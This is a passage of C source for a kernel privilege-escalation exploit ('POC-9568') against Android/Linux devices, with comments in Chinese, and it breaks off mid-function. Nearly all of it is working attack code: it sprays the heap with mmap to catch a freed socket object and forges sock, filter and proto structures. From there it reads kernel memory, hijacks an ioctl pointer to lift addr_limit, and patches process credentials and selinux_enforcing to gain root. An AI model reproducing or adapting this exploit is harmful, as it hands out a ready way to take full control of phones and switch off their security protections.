#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/filter.h>
#include <sys/mman.h>
#include <arpa/inet.h>

#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <pthread.h>

#include "common.h"
#include "kallsym.h"
#include "offsets.h"
#include "getroot.h"


//#define POC_TEST
/* 用于参数不确定的手机测试，只能单个测试，按照顺序测试，测试完成一个参数设置好之后
 * 再测试下一个，前提是可以创建出UAF数据，并且sk_bind_node.next指针偏移为0x18 */
//#define TEST_CALCULATE_SLAB		// 测试slab对象大小
//#define TEST_OFFSET_SKSTAMP		// 测试sk_stamp在sock结构体中的偏移
//#define TEST_OFFSET_SECURITY		// 测试security字段在sock结构中的偏移
//#define TEST_OFFSET_SKFILTER		// 测试sk_filter字段在sock结构体中的偏移
//#define TEST_OFFSET_LOCK    		// 测试sk_lock字段在sock结构体中的偏移
//#define TEST_COPY_KERNEL

#define REP_PAGE_SIZE			0x1000		/* 页大小 */
#define UNUSE_PORT  			42420		/* 未使用的端口号 */

#define FOLLOW_NUM   			3		/* 一次创建多少个UAF，不能少于3个 */
#define DUPFD_NUM   			FOLLOW_NUM
#ifdef LEAK_NORMAL_SOCK
#define BIND_NUM    			3		/* 用于泄漏内核指针，需要创建的sock个数 */
#else
#define BIND_NUM    			1
#endif

#define UAFGP_NUM   			100		/* 制造UAF组个数（FOLLOW_NUM个UAF为一组），通过一组UAF才能泄漏内核信息 */
#define REP_COUNT_MAX			10		/* 堆喷失败后重复尝试的次数 */
#define REP_ERROR_MAX			40		/* 其他失败后重复尝试的次数 */

struct skaddr{
	struct {
		unsigned long user_next;
		unsigned long kern_next;
		unsigned long kern_prev;
	}addr[2];
};

/*
 * sizeof(struct sk_buff) = 244 对齐后 256
 * rcvbuf >= [(2048+256)/2 = 1152]
 * rcvbuf <= [sysctl_rmem_max = 8388608]
 */
#define RCVBUF_BASE 			1152			/* 设置sock.sk_rcvbuf字段的基数 */

#ifdef ARCH_ARM32
#define NSEC_PER_SEC			  1000000000	/* 用于计算sk_stamp */
#define STAMP_FLAGS 			0x1111111111111111	/* 设置sock.sk_stamp标志，便于计算 */
#else
#define NSEC_PER_SEC			  1000000000L	/* 用于计算sk_stamp */
#define STAMP_FLAGS 			500600600600UL	/* 设置sock.sk_stamp标志，便于计算 */
#endif

#define MAX_MMAP_COUNT     		2000				/* mmap地址最大数 */
#define MMAP_HEAP_SPRAY_LEN		0x400000		/* 一次mmap内存的大小 */

unsigned long mmap_count;						/* 需要mmap的次数 */
unsigned long *mmap_addr[MAX_MMAP_COUNT] = { 0 }; /* mmap地址的数组 */

void* store_kern_data;			/* 该指针指向的内存，用于存放拷贝的内核数据 */
struct devinfo* info;			/* 适配手机信息 */
int uafgp_num_max;				/* UAF组最大个数 */

void* uaf_kern_page;			/* 堆喷成功后对应sock数据所在页的内核起始地址 */
void* uaf_user_page;			/* 堆喷成功后对应sock数据所在页的用户起始地址 */
char* norm_sk;					/* 泄漏的正常的sock结构体地址 */
char* user_proto;
char* user_fprog;
char* user_ops;

/* 利用漏洞拷贝内核数据 */
int copy_kernel_data(int fd, unsigned long to, unsigned long from, int size)
{
	int ret = 0;
	int len = size;

	/* 设置拷贝内核数据的长度和地址 */
	*(unsigned long*)(user_fprog + info->offset_fprogkern_len) = size/8;
	*(unsigned long*)(user_fprog + info->offset_fprogkern_filter) = from;
	/* 拷贝内核数据到用户态ptr指向的内存 */
	if((ret = getsockopt(fd, SOL_SOCKET, SO_GET_FILTER, (void*)to, (socklen_t *)&len)) < 0) {
		printf("   读取内核失败! len: %d; ret: %d; error: %s\n", len, ret, strerror(errno));
		return -1;
	}

	return 0;
}

/* 通过控制PC漏洞，调用sock_kernel_ioctl函数设置 addr_limit=-1 */
int patch_addr_limit(int fd)
{
	unsigned long* ptr;
	unsigned long addr = 0;
	int i, ret = 0;

#if 0	/* 验证是否可以读取内核代码 */
	unsigned int* code;
	addr = kallsyms_lookup_name("kernel_sock_ioctl");
	code = (unsigned int *)store_kern_data;
	copy_kernel_data(fd, (unsigned long)code, addr, 80);
	for(i = 0; i < 80/4; i++){
		printf("   >>>>>> inst 0x%x\n", *code++);
	}
	sleep(1);
#endif

	addr = kallsyms_lookup_name("kernel_sock_ioctl");
	*(unsigned long*)(user_proto + info->offset_proto_ioctl) = addr;
#ifdef ARCH_ARM32
	*(unsigned long*)(user_ops + info->offset_proto_ops_ioctl) = addr + info->offset_kernel_sock_ioctl;
#else
	*(unsigned long*)(user_proto + info->offset_proto_ops_ioctl) = addr + info->offset_kernel_sock_ioctl;
#endif
	ret = ioctl(fd, 0X5411, 0x111111);

#if 0	/* 验证是否受PAN限制 */
	addr = kallsyms_lookup_name("tcp_prot");
	ptr = (unsigned long *)store_kern_data;
	copy_kernel_data(fd, (unsigned long)ptr, addr, 80);
	for(i = 0; i < 80/8; i++){
		printf("   >>>>>> kernel addr 0x%lx\n", *ptr++);
	}

	addr = kallsyms_lookup_name("tcp_prot");
	ptr = (unsigned long *)(uaf_kern_page);
	kernel_read((void*)addr, (void*)ptr, 80);
	ptr = (unsigned long *)(uaf_user_page);
	for(i = 0; i < 80/8; i++){
		printf("   >>>>>> kernel addr 0x%lx\n", *ptr++);
	}
#endif

	return ret;
}


/* root流程 */
void poc_root(int fd)
{
#if 1	/* 开启PAN功能 */
	patch_addr_limit(fd);
	printf("   patch addr_limit ok\n");
	sleep(1);
	patch_cred((void*)kallsyms_lookup_name("init_task"), "poc-9568", uaf_kern_page, uaf_user_page, REP_PAGE_SIZE);
	printf("   patch cred ok\n");
	sleep(1);
	patch_selinux((void*)kallsyms_lookup_name("selinux_enforcing"), uaf_kern_page, uaf_user_page);
	printf("   patch selinux ok\n");
	sleep(1);
#else
	void* addr = malloc(REP_PAGE_SIZE);
	patch_addr_limit(fd);
	printf("   patch addr_limit ok\n");
	sleep(1);
	patch_cred((void*)kallsyms_lookup_name("init_task"), "poc-9568", addr, addr, REP_PAGE_SIZE);
	printf("   patch cred ok\n");
	sleep(1);
	patch_selinux((void*)kallsyms_lookup_name("selinux_enforcing"), addr, addr);
	printf("   patch selinux ok\n");
	sleep(1);
	free(addr);
#endif
}

/* 拷贝内核 */
int copy_kernel(int fd)
{
	unsigned long *ptr;
	unsigned long base = 0;
	int ret = 0;
	int len = 0;
	int i;

#ifdef TEST_COPY_KERNEL
	printf("   开始测试拷贝内核数据\n");
	base = (unsigned long)norm_sk;
	len = info->object_size;
	ptr = (unsigned long *)store_kern_data;
	copy_kernel_data(fd, (unsigned long)ptr, base, len);
	for(i = 0; i < info->object_size/4; i++){
		printf("   [%d] 0x%lx\n", i, *(unsigned long *)ptr++);
	}
	printf("   测试拷贝内核数据结束\n");
	return 0;
#endif

	/* 开启地址随机化，且不可以任意拷贝内核的前提下，需要泄漏正常的sock结构体内容 */
#ifdef LEAK_NORMAL_SOCK
	/* 1、此处是拷贝正常的sock结构体内容，里面存放有内核全局变量tcp_prot地址 */
	/* 设置拷贝内核的地址，设置为泄漏的正常的sock结构体地址 */
	base = (unsigned long)norm_sk;
	/* 设置拷贝内核的长度，设置为可以读取到sk_prot字段即可 */
	len = info->offset_sock_skprot + 0x10;
	/* 设置用户态存放内核数据的地址 */
	ptr = (unsigned long *)store_kern_data;
	copy_kernel_data(fd, (unsigned long)ptr, base, len);
	printf("   [0x%lx] tcp_prot\n", *(unsigned long*)((char*)ptr + info->offset_sock_skprot));

	/* 2、此处拷贝tcp_prot的内容 */
	/* 设置拷贝内核的地址，设置为全局变量tcp_prot的地址 */
	base = *(unsigned long*)((char*)ptr + info->offset_sock_skprot);
	/* 设置拷贝内核的长度，此处拷贝tcp_prot的前80个字节，即10个内核函数地址 */
	len = 80;
	/* 设置用户态存放内核数据的地址 */
	ptr = (unsigned long *)store_kern_data;
	copy_kernel_data(fd, (unsigned long)ptr, base, len);

	/* 3、获取tcp_prot中内核函数地址 */
	for(i = 0; i < 80/8; i++){
		base = *ptr;
		//printf("   >>>>>> kernel addr 0x%lx\n", *ptr);
		if(base > KERNEL_ADDR_MARK)
			break;
		ptr++;
	}
	/* 依据得到的内核函数地址加上计算好的偏移，地址对齐处理后得到读取内核符号表的起始地址 */
	base = (base + info->kern_copy_offset) & (~0xfUL);
#else
	/* 未开启地址随机化，且可以任意拷贝内核的前提下，可以设置固定的内核基址 */
	if(info->kern_copy_addr < KERNEL_ADDR_MARK){
		printf("   参数错误，读取内核失败!  kern_copy_addr = 0x%lx\n", info->kern_copy_addr);
		return -1;
	}
	/* 拷贝内核数据的基址 */
	base = info->kern_copy_addr + info->kern_copy_offset;
#endif
	printf("   [0x%lx] copy base address\n", base);
	/* 设置用户态存放内核数据的地址 */
	ptr = (unsigned long *)store_kern_data;

	/* 4、拷贝内核符号表数据 */
	for(i = 0; i < (info->kern_copy_size/info->kern_copy_len); i++){
		/* 设置每次可以拷贝的数据长度 */
		len = info->kern_copy_len;
		copy_kernel_data(fd, (unsigned long)ptr, base, len);
		/* 更新拷贝位置 */
		base = base + info->kern_copy_len;
		ptr = (unsigned long *)((unsigned char*)ptr + info->kern_copy_len);
	}

	return 0;
}

/* 伪造sock结构体内容 */
int fake_sock_data(struct skaddr* sk)
{
	//char* norm_sk = 0;
	char* user_sk;
	//char* user_proto;
	char* user_filter;
	char* user_prog;
	//char* user_fprog;
	char* user_secur;

	char* kern_sk;
	char* kern_proto;
	char* kern_filter;
	char* kern_prog;
	char* kern_fprog;
	char* kern_secur;
	char* kern_ops;
	
	int size_sk = info->offset_sock_sksecurity + 0x8;
	int size_proto = info->offset_proto_releasecb + 0x8;
	int size_filter = info->offset_skfilter_prog + 0x8;
	int size_prog = info->offset_bpfprog_origprog + 0x10;
	int size_fprog = info->offset_fprogkern_filter + 0x10;
	int size_secur = 0x20;
	
	int i;

	/* 计算UAF的sock结构体对应的内核地址和用户态地址 */
	if(sk->addr[0].kern_prev){
		user_sk = (char*)(sk->addr[0].user_next - info->offset_sock_sknode_next);
		kern_sk = (char*)(sk->addr[1].kern_next - info->offset_sock_sknode_next);
		norm_sk = (char*)(sk->addr[0].kern_next - info->offset_sock_sknode_next);
		printf("   user_sk 0x%lx, kern_sk 0x%lx, norm_sk 0x%lx\n", 
					(unsigned long)user_sk, (unsigned long)kern_sk, (unsigned long)norm_sk);
	}
	else if(sk->addr[1].kern_prev){
		user_sk = (char*)(sk->addr[1].user_next - info->offset_sock_sknode_next);
		kern_sk = (char*)(sk->addr[0].kern_next - info->offset_sock_sknode_next);
		norm_sk = (char*)(sk->addr[1].kern_next - info->offset_sock_sknode_next);
		printf("   user_sk 0x%lx, kern_sk 0x%lx, norm_sk 0x%lx\n", 
					(unsigned long)user_sk, (unsigned long)kern_sk, (unsigned long)norm_sk);
	}
	else{
		printf("    伪造sock结构体数据失败！\n");
		return -1;
	}
	uaf_user_page = (void*)((unsigned long)user_sk & (~0xfffUL));
	uaf_kern_page = (void*)((unsigned long)kern_sk & (~0xfffUL));

	/* 伪造数据的用户态基址 */
	user_proto = user_sk + size_sk;
	user_filter = user_proto + size_proto;
	user_prog = user_filter + size_filter;
	user_fprog = user_prog + size_prog;
	user_secur = user_fprog + size_fprog;
	user_ops = user_secur + size_secur;

	/* 伪造数据的内核态基址 */
	kern_proto = kern_sk + size_sk;
	kern_filter = kern_proto + size_proto;
	kern_prog = kern_filter + size_filter;
	kern_fprog = kern_prog + size_prog;
	kern_secur = kern_fprog + size_fprog;
	kern_ops = kern_secur + size_secur;

	*(unsigned long*)(user_sk + info->offset_socket_ops) = (unsigned long)(kern_ops);

	*(unsigned long*)(user_sk + info->offset_sock_skprot) = (unsigned long)(kern_proto);	//struct sock sk_prot = kernel address

	*(unsigned int*)(user_sk + info->offset_sock_sklock_slock) = 0;		//struct sock sk_lock.slock = 0
	*(unsigned int*)(user_sk + info->offset_sock_sklock_owned) = 0;		//struct sock sk_lock.owned = 0
	*(unsigned long*)(user_sk + info->offset_sock_sklock_wq_lock) = 0;		//struct sock sk_lock.wq.lock = 0
	*(unsigned long*)(user_sk + info->offset_sock_sklock_wq_list) = 
			(unsigned long)(kern_sk + info->offset_sock_sklock_wq_list);	//struct sock sk_lock.wq.task_list.next = &sk_lock.wq.task_list

	//*(unsigned long*)(user_sk + info->offset_sock_skbacklog_tail) = 0;		//struct sock sk_backlog.tail = 0

	*(unsigned long*)(user_sk + info->offset_sock_skfilter) = (unsigned long)(kern_filter);	//struct sock sk_filter = kernel address

#ifndef TEST_OFFSET_SECURITY
	*(unsigned long*)(user_sk + info->offset_sock_sksecurity) = (unsigned long)(kern_secur); //struct sock sk_security = kernel address
#endif
	//*(unsigned int*)(user_secur + 0x0) = 1;	// struct sk_security_struct sid = 1
	//*(unsigned int*)(user_secur + 0x4) = 1;
	//*(unsigned int*)(user_secur + 0x8) = 1;
	//*(unsigned int*)(user_secur + 0xc) = 1;
	//*(unsigned int*)(user_secur + 0x10) = 1;
	*(unsigned int*)(user_secur + info->offset_sksecurity_sid) = 1;

	//*(unsigned long*)(user_proto + info->offset_proto_releasecb) = 0;	//struct proto release_cb = NULL

	//*(unsigned long*)(user_filter + 0x0) = (unsigned long)(kern_prog);	//struct sk_filter prog = kernel address
	//*(unsigned long*)(user_filter + 0x4) = (unsigned long)(kern_prog);	//struct sk_filter prog = kernel address
	//*(unsigned long*)(user_filter + 0x8) = (unsigned long)(kern_prog);	//struct sk_filter prog = kernel address
	//*(unsigned long*)(user_filter + 0xc) = (unsigned long)(kern_prog);	//struct sk_filter prog = kernel address
	*(unsigned long*)(user_filter + info->offset_skfilter_prog) = (unsigned long)(kern_prog);	//struct sk_filter prog = kernel address

	//*(unsigned long*)(user_prog + 0x0) = (unsigned long)(kern_fprog);	//struct bpf_prog orig_prog = kernel address
	//*(unsigned long*)(user_prog + 0x4) = (unsigned long)(kern_fprog);	//struct bpf_prog orig_prog = kernel address
	//*(unsigned long*)(user_prog + 0x8) = (unsigned long)(kern_fprog);	//struct bpf_prog orig_prog = kernel address
	//*(unsigned long*)(user_prog + 0xc) = (unsigned long)(kern_fprog);	//struct bpf_prog orig_prog = kernel address
	//*(unsigned long*)(user_prog + 0x10) = (unsigned long)(kern_fprog);	//struct bpf_prog orig_prog = kernel address
	*(unsigned long*)(user_prog + info->offset_bpfprog_origprog) = (unsigned long)(kern_fprog);	//struct bpf_prog orig_prog = kernel address

#ifdef TEST_OFFSET_SECURITY
	for(i = 11; i < 12; i++){
		*(unsigned long*)(user_sk + info->offset_sock_skstamp + i*ADDR_BYTE_LEN) = (unsigned long)(kern_secur);
	}
#endif
#ifdef TEST_OFFSET_LOCK
	for(i = 22; i < 23; i++){
		*(unsigned int*)(user_sk + i*4) = 20;
	}
#endif
#ifdef TEST_OFFSET_SKFILTER
	for(i = 30; i < 74; i++){
		*(unsigned int*)(user_sk + i*4) = i;
	}
#endif

	return 0;
}

#ifndef TEST_CALCULATE_SLAB
/* 在mmap的内存中查找UAF数据对应的内存地址 */
int find_uaf_data(struct skaddr* sk)
{
	int i, j, k, n = 0, m = 0;
	unsigned char *p;
	int offset;
	int flags = 0;
	int count = MMAP_HEAP_SPRAY_LEN / REP_PAGE_SIZE;

	for (i = 0; i < mmap_count; i++) {
		for (j = 0; j < count; j++) {
			p = (unsigned char*)mmap_addr[i] + j * REP_PAGE_SIZE;
			for(k = 0; k < info->object_nums; k++) {
				offset = (k * info->object_size) % REP_PAGE_SIZE;
#ifdef LEAK_NORMAL_SOCK
				if((offset + info->offset_sock_sknode_next) < (REP_PAGE_SIZE - sizeof(unsigned long))){
					if((0 != *(unsigned long*)(p + offset + info->offset_sock_sknode_next)) && (STAMP_FLAGS != *(s64*)(p + offset + info->offset_sock_sknode_next))){
						sk->addr[n].user_next = (unsigned long)(p + offset + info->offset_sock_sknode_next);
						sk->addr[n].kern_next = (unsigned long)(*(unsigned long*)(p + offset + info->offset_sock_sknode_next));
						sk->addr[n].kern_prev = (unsigned long)(*(unsigned long*)(p + offset + info->offset_sock_sknode_prev));
						printf("   bind node 0x%lx, 0x%lx, 0x%lx\n", sk->addr[n].user_next, sk->addr[n].kern_next, sk->addr[n].kern_prev);
						n++;
#ifdef TEST_OFFSET_SKSTAMP
						/* 设置标记用于计算sk_stamp字段在sock结构体中的偏移 */
						for(m = 0; m < 96; m++){
							*(s64*)(p + offset + m*8) = STAMP_FLAGS + m;
						}
#endif
						if(0 == flags){
							flags = i;
						}
						else{
							flags = (flags << 16) + i;
#ifndef TEST_OFFSET_SKSTAMP
							memset(mmap_addr[i], 0, MMAP_HEAP_SPRAY_LEN);
#endif
							/* 释放不再使用的内存 */
							for (++i; i < mmap_count; i++) {
								if(mmap_addr[i] > 0) {
									munmap(mmap_addr[i], MMAP_HEAP_SPRAY_LEN);
									mmap_addr[i] = 0;
								}
							}
							return flags;
						}
					}
				}
#else
				if((offset + info->offset_sock_sknode_next) < (REP_PAGE_SIZE - sizeof(unsigned long))){
					if((0 != *(unsigned long*)(p + offset + info->offset_sock_sknode_next)) && (STAMP_FLAGS != *(s64*)(p + offset + info->offset_sock_sknode_next))){
						sk->addr[n].user_next = (unsigned long)(p + offset + info->offset_sock_sknode_next);
						sk->addr[n].kern_next = (unsigned long)(*(unsigned long*)(p + offset + info->offset_sock_sknode_next));
						sk->addr[n].kern_prev = (unsigned long)(*(unsigned long*)(p + offset + info->offset_sock_sknode_prev));
						printf("   bind node 0x%lx, 0x%lx, 0x%lx\n", sk->addr[n].user_next, sk->addr[n].kern_next, sk->addr[n].kern_prev);
						n++;
#ifdef TEST_OFFSET_SKSTAMP
						/* 设置标记用于计算sk_stamp字段在sock结构体中的偏移 */
						for(m = 0; m < 96; m++){
							*(unsigned long*)(p + offset + m*8) = 500600000000 + m;
						}
#endif
						if(0 == flags){
							flags = i;
						}
						else{
							flags = (flags << 16) + i;
#ifndef TEST_OFFSET_SKSTAMP
							memset(mmap_addr[i], 0, MMAP_HEAP_SPRAY_LEN);
#endif
							/* 释放不再使用的内存 */
							for (++i; i < mmap_count; i++) {
								if(mmap_addr[i] > 0) {
									munmap(mmap_addr[i], MMAP_HEAP_SPRAY_LEN);
									mmap_addr[i] = 0;
								}
							}
							return flags;
						}
					}
				}
				if((offset + info->offset_sock_sknode_prev) < (REP_PAGE_SIZE - sizeof(unsigned long))){
					if((0 != *(unsigned long*)(p + offset + info->offset_sock_sknode_prev)) && (STAMP_FLAGS != *(s64*)(p + offset + info->offset_sock_sknode_prev))){
						sk->addr[n].user_next = (unsigned long)(p + offset + info->offset_sock_sknode_next);
						sk->addr[n].kern_next = (unsigned long)(*(unsigned long*)(p + offset + info->offset_sock_sknode_next));
						sk->addr[n].kern_prev = (unsigned long)(*(unsigned long*)(p + offset + info->offset_sock_sknode_prev));
						printf("   bind node 0x%lx, 0x%lx, 0x%lx\n", sk->addr[n].user_next, sk->addr[n].kern_next, sk->addr[n].kern_prev);
						n++;
#ifdef TEST_OFFSET_SKSTAMP
						/* 设置标记用于计算sk_stamp字段在sock结构体中的偏移 */
						for(m = 0; m < 96; m++){
							*(unsigned long*)(p + offset + m*8) = 500600000000 + m;
						}
#endif
						if(0 == flags){
							flags = i;
						}
						else{
							flags = (flags << 16) + i;
#ifndef TEST_OFFSET_SKSTAMP
							memset(mmap_addr[i], 0, MMAP_HEAP_SPRAY_LEN);
#endif
							/* 释放不再使用的内存 */
							for (++i; i < mmap_count; i++) {
								if(mmap_addr[i] > 0) {
									munmap(mmap_addr[i], MMAP_HEAP_SPRAY_LEN);
									mmap_addr[i] = 0;
								}
							}
							return flags;
						}
					}

				}
#endif
			}
		}
		munmap(mmap_addr[i], MMAP_HEAP_SPRAY_LEN);
		mmap_addr[i] = 0;
	}
	return -1;
}
#else
int find_uaf_data(struct skaddr* sk)
{
	int i, j, k, n = 0;
	int buf[3][2] = {0,};
	unsigned char *p;
	int count = MMAP_HEAP_SPRAY_LEN / REP_PAGE_SIZE;

	for (i = 0; i < mmap_count; i++) {
		for (j = 0; j < count; j++) {
			p = (unsigned char*)mmap_addr[i] + j * REP_PAGE_SIZE;
			for(k = 0; k < REP_PAGE_SIZE; k+=8){
				if(*(unsigned long*)(p + k)){
					buf[n][0] = k;
					buf[n][1] = j;
					n++;
					printf("   >>>>>> [%2d, %2d, %4d] 0x%lx [0x%lx]\n", i, j, k, (unsigned long)(p + k), *(unsigned long*)(p + k));
				}
			}
		}
	}
	printf("buf[0][0] = %d; buf[0][1] = %d \n", buf[0][0], buf[0][1]);
	printf("buf[1][0] = %d; buf[1][1] = %d \n", buf[1][0], buf[1][1]);
	printf("buf[2][0] = %d; buf[2][1] = %d \n", buf[2][0], buf[2][1]);
	/* 计算slab对象的大小 */
#ifdef LEAK_NORMAL_SOCK
#ifdef ARCH_ARM32
	if(buf[1][0] < buf[0][0]){
		if(buf[1][1] - buf[0][1] == 1)
			printf("   >>>>>> object_size = %d\n", ((buf[1][0] + REP_PAGE_SIZE) - buf[0][0]) / 2);
		else
			printf("   >>>>>> object_size 计算错误，请重新运行\n");
	}
	else{
		if(buf[0][1] - buf[1][1] == 1)
			printf("   >>>>>> object_size = %d\n", ((buf[0][0] + REP_PAGE_SIZE) - buf[1][0]) / 2);
		else
			printf("   >>>>>> object_size 计算错误，请重新运行\n");
	}
#else
	if(buf[2][0] < buf[0][0]){
		if(buf[2][1] - buf[0][1] == 1)
			printf("   >>>>>> object_size = %d\n", ((buf[2][0] + REP_PAGE_SIZE) - buf[0][0]) / 2);
		else
			printf("   >>>>>> object_size 计算错误，请重新运行\n");
	}
	else{
		if(buf[0][1] - buf[2][1] == 1)
			printf("   >>>>>> object_size = %d\n", ((buf[0][0] + REP_PAGE_SIZE) - buf[2][0]) / 2);
		else
			printf("   >>>>>> object_size 计算错误，请重新运行\n");
	}
#endif
#else
	if(buf[1][0] < buf[0][0]){
		if(buf[1][1] - buf[0][1] == 1)
			printf("   >>>>>> object_size = %d\n", ((buf[1][0] + REP_PAGE_SIZE) - buf[0][0] + 8) / 2);
		else
			printf("   >>>>>> object_size 计算错误，请重新运行\n");
	}
	else{
		if(buf[0][1] - buf[1][1] == 1)
			printf("   >>>>>> object_size = %d\n", ((buf[0][0] + REP_PAGE_SIZE) - buf[1][0] + 8) / 2);
		else
			printf("   >>>>>> object_size 计算错误，请重新运行\n");
	}
#endif
	return 0;
}
#endif

/* 使用mmap进行堆喷 */
int mmap_heap_spray(void)
{
	int i, j, k;
	int count;

	for (i = 0; i < mmap_count; i++) {
		mmap_addr[i] = (unsigned long*)mmap(NULL, MMAP_HEAP_SPRAY_LEN, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if (mmap_addr[i] == MAP_FAILED) {
			printf("[POC-9568] [ERROR] [%3d] mmap %3d failed!\n", __LINE__, i);
			return -1;
		}
		/* 锁定申请的内存，防止换入换出 */
		mlock(mmap_addr[i], MMAP_HEAP_SPRAY_LEN);
		count = MMAP_HEAP_SPRAY_LEN / REP_PAGE_SIZE;
		/* 设置堆喷检查标记 */
		for (j = 0; j < count; j++) {
			unsigned char *p;
			p = (unsigned char*)mmap_addr[i] + j * REP_PAGE_SIZE;
#if (defined TEST_OFFSET_SKSTAMP || defined TEST_CALCULATE_SLAB)
			/* 平铺设置标记，防止不同机型偏移不同 */
			for(k = 0; k < REP_PAGE_SIZE; k += 8){
				*(s64*)(p + k) = STAMP_FLAGS;
			}
#else
			for(k = 0; k < info->object_nums; k++) {
				int offset;
				offset = (k * info->object_size) % REP_PAGE_SIZE;
				if(offset + info->offset_sock_skstamp < REP_PAGE_SIZE - sizeof(unsigned long))
					*(s64*)(p + offset + info->offset_sock_skstamp) = STAMP_FLAGS;
			}
#endif
		}
	}

	return 0;
}

/* 释放mmap内存 */
void unmap_heap_spray(void)
{
	int i;

	for (i = 0; i < mmap_count; i++) {
		if(mmap_addr[i] > 0) {
			munmap(mmap_addr[i], MMAP_HEAP_SPRAY_LEN);
			mmap_addr[i] = 0;
		}
	}
}

/* 开始堆喷 */
int start_heap_spray(void)
{
	unsigned long mem_total = 0;
	unsigned long mem_free = 0;


	/* 获取当前系统剩余内存大小 */
	if (get_mem_info("MemTotal", &mem_total)) {
		printf("[POC-9568] [ERROR] [%3d] get mem info failed!\n", __LINE__);
		return -1;
	}
	if (get_mem_info("MemFree", &mem_free)) {
		printf("[POC-9568] [ERROR] [%3d] get mem info failed!\n", __LINE__);
		return -1;
	}

	/* 计算需要喷射的次数 */
	mem_total *= 1024;
	mem_total = mem_total - (mem_total / 1.3);
	mmap_count = mem_total / MMAP_HEAP_SPRAY_LEN;

	if(mmap_count > MAX_MMAP_COUNT){
		mmap_count = MAX_MMAP_COUNT;
	}
	printf("   要喷射内存大小: 0x%lx ，需要mmap的次数: %ld \n", mem_total, mmap_count);

	if (mmap_heap_spray()) {
		printf("[POC-9568] [ERROR] [%3d] mmap heap spray failed!\n", __LINE__);
		return -1;
	}

	return 0;
}

#define MMAP_ONCE_LEN			0x400000	/* 4MB */
#define MMAP_PAGE_COUNT			MMAP_ONCE_LEN/REP_PAGE_SIZE

void get_meminfo(void)
{
	unsigned long mem_total;
	unsigned long mem_free;
	unsigned long high_total;
	unsigned long high_free;
	unsigned long low_total;
	unsigned long low_free;

//	get_mem_info("MemTotal", &mem_total);
	get_mem_info("MemFree", &mem_free);
//	get_mem_info("HighTotal", &high_total);
	get_mem_info("HighFree", &high_free);
//	get_mem_info("LowTotal", &low_total);
	get_mem_info("LowFree", &low_free);

	printf("=================================================================\n");
//	printf("MemTotal:\t%ld \tkB\n", mem_total);
	printf("MemFree:\t%ld \tkB\n", mem_free);
//	printf("HighTotal:\t%ld \tkB\n", high_total);
	printf("HighFree:\t%ld \tkB\n", high_free);
//	printf("LowTotal:\t%ld \tkB\n", low_total);
	printf("LowFree:\t%ld \tkB\n", low_free);
	printf("=================================================================\n");
}


int expend_memory(char* name, unsigned long **paddr)
{
	unsigned long mem_free;
	unsigned long mem_size;
	unsigned long* maddr;
	int mcount;
	int i, j, k;

	if(get_mem_info(name, &mem_free)){
		printf("[ERROR] get high free meminfo failed!\n");
		return -1;
	}

	mem_size = mem_free * 1024 * 1.1;

	mcount = mem_size / MMAP_ONCE_LEN;

//	printf("+++++++++++++++++++++++++++++++++++++++++++++++++++++++\n");
//	printf("%s: %ld kB, size: %ld B\n", name, mem_free, mem_size);
//	printf("mmap count: %d; mmap total size: %ld; free: %ld\n",
//		 mcount, (unsigned long)mcount*MMAP_ONCE_LEN, mem_size - mcount*MMAP_ONCE_LEN);
//	printf("expend_memory mmap count: %d\n", mcount);
//	printf("+++++++++++++++++++++++++++++++++++++++++++++++++++++++\n");

	maddr = (unsigned long*)malloc(sizeof(void*)*mcount);
	*paddr = maddr;

	for (i = 0; i < mcount; i++) {
		maddr[i] = (unsigned long)mmap(NULL, MMAP_ONCE_LEN, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if ((void*)maddr[i] == MAP_FAILED) {
			printf("[ERROR] %s mmap %3d failed! error: %s\n", __FUNCTION__, i, strerror(errno));
			return i;
		}
		/* 锁定申请的内存，防止换入换出 */
		mlock((void*)maddr[i], MMAP_ONCE_LEN);
		for (j = 0; j < MMAP_PAGE_COUNT; j++) {
			unsigned long *p;
			p = (unsigned long*)(maddr[i] + j * REP_PAGE_SIZE);
			//for(k = 0; k < REP_PAGE_SIZE; k += sizeof(void*)){
			//	*(unsigned long*)(p + k) = STAMP_FLAGS;
			//}
			*p = 0x12345678;
		}
	}

	return mcount;
}

int expend_munmap(int count, unsigned long *addr)
{
	int i;

	for (i = 0; i < count; i++) {
		if(addr[i] > 0) {
			munmap((void*)addr[i], MMAP_ONCE_LEN);
			addr[i] = 0;
		}
	}

	return 0;
}


/* 计算检查标记的转换值 */
#ifndef ARCH_ARM32
void set_check_flag(s64 addr, int *sec, int *nsec)
{
	int rem;
	rem = addr % NSEC_PER_SEC;
	*sec = addr / NSEC_PER_SEC;

	if(rem < 0) {
		*sec--;
		rem += NSEC_PER_SEC;
	}

	*nsec = rem;
}
#else
void set_check_flag(s64 addr, int *sec, int *nsec)
{
	int rem;
	rem = addr % NSEC_PER_SEC;
	*sec = addr / NSEC_PER_SEC;

	if(rem < 0) {
		*sec--;
		rem += NSEC_PER_SEC;
	}

	*nsec = rem;
}
#endif

/* 创建UAF对象 */
int create_uafdata(int unuse_port, int *uaf_fd, int *leak_fd)
{
	int fd;
	int new_fd, newest_fd, client_fd, client_fd2;
	struct sockaddr_in6 bind_addr;
	struct sockaddr_in bind_addr4, client_addr1, client_addr2;
	struct sockaddr unsp;
	int val;

	struct sockaddr_in bind_addr4_list;
	int bind_fd[BIND_NUM] = {0,};
	int follow_fd[FOLLOW_NUM] = {0,};
	int dup_fd[DUPFD_NUM] = {0,};
	int reuse = 5;
	int rcvbuf = 0, len = 4;
	int res = -1,ret, rep_count = 0, rep_error = 0;
	int run_out_num = info->prev_fill_num;
	int i, j, k;

	int* run_out_fd = (int*)malloc(info->prev_fill_num * sizeof(int));
	int* make_dup_fd = (int*)malloc(info->tail_fill_num * sizeof(int));

	memset(run_out_fd, 0, info->prev_fill_num * sizeof(int));
	memset(make_dup_fd, 0, info->tail_fill_num * sizeof(int));

	memset(&bind_addr4_list, 0, sizeof(bind_addr4_list));
	bind_addr4_list.sin_family = AF_INET;
	bind_addr4_list.sin_port = ntohs(unuse_port);


	/*************************************************************************/
	/* 1、创建tcp socket，用于链表操作泄漏内核地址 */
	for(i = 0; i < BIND_NUM; i++){
		bind_fd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(bind_fd[i] < 0){
			printf("[POC-9568] [ERROR] [%3d] get socket bind_fd[%d] failed!\n", __LINE__, i);
			goto err;
		}
